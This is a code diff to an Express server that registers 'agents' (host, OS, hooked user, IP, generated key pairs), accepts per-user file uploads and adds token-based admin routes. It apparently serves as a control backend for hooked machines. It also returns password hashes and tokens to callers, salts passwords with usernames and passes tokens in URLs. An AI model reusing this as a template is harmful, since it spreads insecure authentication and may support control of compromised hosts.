@@ -1,9 +1,16 @@
 const express = require('express');
 const mysql = require('mysql');
 const crypto = require("crypto");
+const https = require('https');
 const multer = require("multer");
+var cors = require('cors');
 const fs = require('fs');
 const path = require('path');
+
+const httpsOptions = {
+  key: fs.readFileSync('key.pem'),
+  cert: fs.readFileSync('cert.pem')
+};
 
 try {
   const folderName = "/CTHULHU/users"
@@ -15,11 +22,17 @@ try {
 }
 
 const app = express();
+
 const port = 5000;
 
+const USER_ADMIN_ROLE = 1
+const USER_READER_ROLE = 2
+const USER_SCAN_ROLE = 3
 
+app.use(cors()) // setup cors headers
 app.use(express.json()) // for parsing application/json
 
+app.set('trust proxy', true)
 
 // Configure multer with a dynamic destination folder
 const storage = multer.diskStorage({
@@ -51,6 +64,24 @@ db.connect((err) => {
   console.log('Connected to MySQL database as ID ' + db.threadId);
 });
 
+const checkToken = async (username, token, userId = -1) => {
+  return new Promise((resolve, reject) => {
+    db.query('SELECT * FROM users WHERE (user_name = ? OR user_id = ?) AND user_token = ?', [username, userId, token], (error, results) => {
+      if (error) {
+        return reject(error);
+      }
+      let userTokenInfo = { userId: -1, username: "", userRole: -1, isTokenValid: false }
+      if (results.length > 0) {
+        userTokenInfo.userId = results[0].user_id
+        userTokenInfo.username = results[0].user_name
+        userTokenInfo.userRole = results[0].role_id
+        userTokenInfo.isTokenValid = true
+      }
+      resolve(userTokenInfo);
+    })
+  });
+}
+
 
 // API endpoint for receiving data
 app.post('/api/agent/new', (req, res) => {
@@ -79,8 +110,8 @@ app.post('/api/agent/new', (req, res) => {
     const publicKeyStr = publicKey.toString();
 
     // Insert data into MySQL
-    const sql = `INSERT INTO agent (versionOS, host, hookUser, privKey, pubKey) VALUES (?, ?, ?, ?, ?)`;
-    const values = [req.body.versionOS, req.body.host, req.body.hookUser, privateKey.toString(), publicKeyStr];
+    const sql = `INSERT INTO agent (versionOS, host, hookUser, privKey, pubKey, ip) VALUES (?, ?, ?, ?, ?, ?)`;
+    const values = [req.body.versionOS, req.body.host, req.body.hookUser, privateKey.toString(), publicKeyStr, req.ip];
 
     // Insert data into MySQL without keys
     db.query(sql, values, (err, result) => {
@@ -184,9 +215,266 @@ app.post('/api/file/upload/:user_folder', upload.single('file'), (req, res) => {
   res.end();
 });
 
+
+// ------------------------------------------------------------USER_ROUTES----------------------------------------------------
+
+app.post('/auth', (req, res) => {
+  var JSON_RES = { data: {}, error: {} }
+  // Ensure the input fields exists and are not empty
+  if (req.body != undefined && req.body.username != undefined && req.body.password != undefined) {
+    // Capture the input fields
+    const username = req.body.username;
+    const password = crypto.pbkdf2Sync(req.body.password, username, 1000, 64, `sha512`).toString(`hex`);
+    // Execute SQL query that'll select the account from the database based on the specified username and password
+    db.query('SELECT * FROM users WHERE user_name = ? AND user_password = ?', [username, password], (error, results) => {
+      // If there is an issue with the query, output the error
+      if (error) throw error;
+      // If the account exists
+      if (results.length > 0) {
+        // Login 
+        const timestamp = new Date().getTime();
+        const token = crypto.pbkdf2Sync(req.body.password + username, timestamp.toString(10), 10, 64, `sha512`).toString(`hex`);
+        // Execute SQL query to set new token for auth
+        db.query('UPDATE users SET user_token = ? WHERE user_name = ?', [token, username], (error) => {
+          // If there is an issue with the query, output the error
+          if (error) throw error;
+
+          JSON_RES.data = { username: username, token: token }
+          res.json(JSON_RES);
+          res.end();
+        });
+      } else {
+        JSON_RES.error = { errorMsg: "Incorrect Username and/or Password" }
+        res.status(403)
+        res.json(JSON_RES);
+        res.end();
+      }
+    });
+  } else {
+    JSON_RES.error = { errorMsg: "Bad parameters" }
+    res.status(400)
+    res.json(JSON_RES);
+    res.end();
+  }
+
+});
+
+app.post('/createUser', (req, res) => {
+  var JSON_RES = { data: {}, error: {} }
+  // Ensure the input fields exists and are not empty
+  if (req.body != undefined && req.body.username != undefined && req.body.password != undefined && req.body.email != undefined) {
+    // Capture the input fields
+    const username = req.body.username;
+    const email = req.body.email;
+    // Check if user already exists
+    db.query('SELECT * FROM users WHERE user_name = ? OR user_email = ?', [username, email], (error, results) => {
+      // If there is an issue with the query, output the error
+      if (error) throw error;
+      // If the account exists
+      if (results.length > 0) {
+        JSON_RES.error = { errorMsg: "User already exists" }
+        res.status(409)
+        res.json(JSON_RES);
+        res.end();
+      } else {
+        //hash password
+        const password = crypto.pbkdf2Sync(req.body.password, username,
+          1000, 64, `sha512`).toString(`hex`);
+
+        // Execute SQL query that'll create new user
+        db.query('INSERT INTO users ( user_name, user_email, user_password, role_id) VALUES (?, ?, ?, ?)', [username, email, password, USER_READER_ROLE], (error) => {
+          // If there is an issue with the query, output the error
+          if (error) throw error;
+
+          const timestamp = new Date().getTime();
+          const token = crypto.pbkdf2Sync(req.body.password + username, timestamp.toString(10), 10, 64, `sha512`).toString(`hex`);
+          // Execute SQL query to set new token for auth
+          db.query('UPDATE users SET user_token = ? WHERE user_name = ?', [token, username], (error) => {
+            // If there is an issue with the query, output the error
+            if (error) throw error;
+
+            JSON_RES.data = { username: username, token: token }
+            res.status(201)
+            res.json(JSON_RES);
+            res.end();
+          });
+        });
+      }
+    });
+
+  } else {
+    JSON_RES.error = { errorMsg: "Bad parameters" }
+    res.status(400)
+    res.json(JSON_RES);
+    res.end();
+  }
+
+});
+
+app.get('/getAgentInfo', async (req, res) => {
+  var JSON_RES = { data: {}, error: {} }
+  if (req.query.reqUsername != undefined && req.query.reqToken != undefined && req.query.agentID != undefined) {
+    const reqUsername = req.query.reqUsername
+    const reqToken = req.query.reqToken
+    const agentId = req.query.agentID
+
+    const reqUserInfo = await checkToken(reqUsername, reqToken)
+    if (reqUserInfo.isTokenValid) {
+      if (reqUserInfo.userRole == USER_ADMIN_ROLE) {
+        db.query('SELECT * FROM agent WHERE agentID = ?', [agentId], (error, results) => {
+          // If there is an issue with the query, output the error
+          if (error) throw error;
+
+          if (results.length > 0) {
+            JSON_RES.data = { agent: results[0] }
+          } else {
+            JSON_RES.error = { errorMsg: "Agent does not exist" }
+            res.status(404)
+          }
+          res.json(JSON_RES);
+          res.end();
+        });
+      } else {
+        JSON_RES.error = { errorMsg: "User is not admin" }
+        res.status(403)
+        res.json(JSON_RES);
+        res.end();
+      }
+    } else {
+      JSON_RES.error = { errorMsg: "Bad token" }
+      res.status(403)
+      res.json(JSON_RES);
+      res.end();
+    }
+  } else {
+    JSON_RES.error = { errorMsg: "Bad parameters" }
+    res.status(400)
+    res.json(JSON_RES);
+    res.end();
+  }
+})
+
+app.get('/getUserInfo', async (req, res) => {
+  var JSON_RES = { data: {}, error: {} }
+  if (req.query.reqUsername != undefined && req.query.reqToken != undefined && (req.query.username != undefined || req.query.userId != undefined)) {
+    const reqUsername = req.query.reqUsername
+    const reqToken = req.query.reqToken
+    const username = req.query.username
+    const userId = req.query.userId
+
+    const reqUserInfo = await checkToken(reqUsername, reqToken)
+    if (reqUserInfo.isTokenValid) {
+      if (reqUserInfo.userRole == USER_ADMIN_ROLE || reqUsername == username) {
+        db.query('SELECT * FROM users WHERE user_name = ? OR user_id = ?', [username, userId], (error, results) => {
+          // If there is an issue with the query, output the error
+          if (error) throw error;
+
+          if (results.length > 0) {
+            JSON_RES.data = { user: results[0] }
+          } else {
+            JSON_RES.error = { errorMsg: "User does not exist" }
+            res.status(404)
+          }
+          res.json(JSON_RES);
+          res.end();
+        });
+      } else {
+        JSON_RES.error = { errorMsg: "User is not admin" }
+        res.status(403)
+        res.json(JSON_RES);
+        res.end();
+      }
+    } else {
+      JSON_RES.error = { errorMsg: "Bad token" }
+      res.status(403)
+      res.json(JSON_RES);
+      res.end();
+    }
+  } else {
+    JSON_RES.error = { errorMsg: "Bad parameters" }
+    res.status(400)
+    res.json(JSON_RES);
+    res.end();
+  }
+})
+
+app.get('/getAllUsers', async (req, res) => {
+  var JSON_RES = { data: {}, error: {} }
+  if (req.query.username != undefined && req.query.token != undefined) {
+    const username = req.query.username
+    const token = req.query.token
+
+    const userInfo = await checkToken(username, token)
+    if (userInfo.isTokenValid) {
+      if (userInfo.userRole == USER_ADMIN_ROLE) {
+        db.query('SELECT user_name, user_email, role_id FROM users', (error, results) => {
+          // If there is an issue with the query, output the error
+          if (error) throw error;
+          JSON_RES.data = { users: results }
+          res.json(JSON_RES);
+          res.end();
+        });
+      } else {
+        JSON_RES.error = { errorMsg: "User is not admin" }
+        res.status(403)
+        res.json(JSON_RES);
+        res.end();
+      }
+    } else {
+      JSON_RES.error = { errorMsg: "Bad token" }
+      res.status(403)
+      res.json(JSON_RES);
+      res.end();
+    }
+  } else {
+    JSON_RES.error = { errorMsg: "Bad parameters" }
+    res.status(400)
+    res.json(JSON_RES);
+    res.end();
+  }
+})
+
+app.get('/getAllAgents', async (req, res) => {
+  var JSON_RES = { data: {}, error: {} }
+  if (req.query.username != undefined && req.query.token != undefined) {
+    const username = req.query.username
+    const token = req.query.token
+
+    const userInfo = await checkToken(username, token)
+    if (userInfo.isTokenValid) {
+      if (userInfo.userRole == USER_ADMIN_ROLE) {
+        db.query('SELECT agentID, host, versionOS, hookUser, ip FROM agent', (error, results) => {
+          // If there is an issue with the query, output the error
+          if (error) throw error;
+          JSON_RES.data = { agents: results }
+          res.json(JSON_RES);
+          res.end();
+        });
+      } else {
+        JSON_RES.error = { errorMsg: "User is not admin" }
+        res.status(403)
+        res.json(JSON_RES);
+        res.end();
+      }
+    } else {
+      JSON_RES.error = { errorMsg: "Bad token" }
+      res.status(403)
+      res.json(JSON_RES);
+      res.end();
+    }
+  } else {
+    JSON_RES.error = { errorMsg: "Bad parameters" }
+    res.status(400)
+    res.json(JSON_RES);
+    res.end();
+  }
+})
+
 // API endpoint for receiving files
 
 // Start the server
-app.listen(port, () => {
+/* app.listen(port, () => {
   console.log(`Server running at http://localhost:${port}/`);
-});
+}); */
+
+https.createServer(httpsOptions, app).listen(port);
